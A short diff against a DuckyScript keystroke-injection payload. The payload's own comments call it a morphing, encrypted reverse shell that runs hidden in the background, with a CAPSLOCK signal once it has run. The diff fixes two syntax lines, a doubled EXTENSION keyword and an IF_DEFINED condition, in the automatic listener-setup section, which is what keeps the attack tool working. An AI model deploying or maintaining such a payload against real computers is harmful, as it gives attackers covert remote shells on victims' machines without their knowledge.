@@ -6,7 +6,7 @@ REM       Requirement: DuckyScript 3.0, PayloadStudio v.1.3 minimum
 REM       Morphing, Encrypted Reverse shell executed hidden in the background with custom identifier, the CAPSLOCK light at the end will indicate that the payload was executed.
 
 REM Extension PASSIVE_WINDOWS_DETECT by Korben for best and fastest deployment with guard rails
-EXTENSION EXTENSION PASSIVE_WINDOWS_DETECT
+EXTENSION PASSIVE_WINDOWS_DETECT
     REM VERSION 1.1
     REM AUTHOR: Korben
 
@@ -137,7 +137,7 @@ REM Automatic setup requires openssl!
 DEFINE #SETUP FALSE
 
 REM Automatic setup and start listener - Requires openssl!
-IF_DEFINED #SETUP
+IF_DEFINED_TRUE #SETUP
     IF ($_OS == #NOT_WINDOWS) THEN    
         DELAY 1500
         STRINGLN echo "Setting up Infrastructre - Do not interact!"
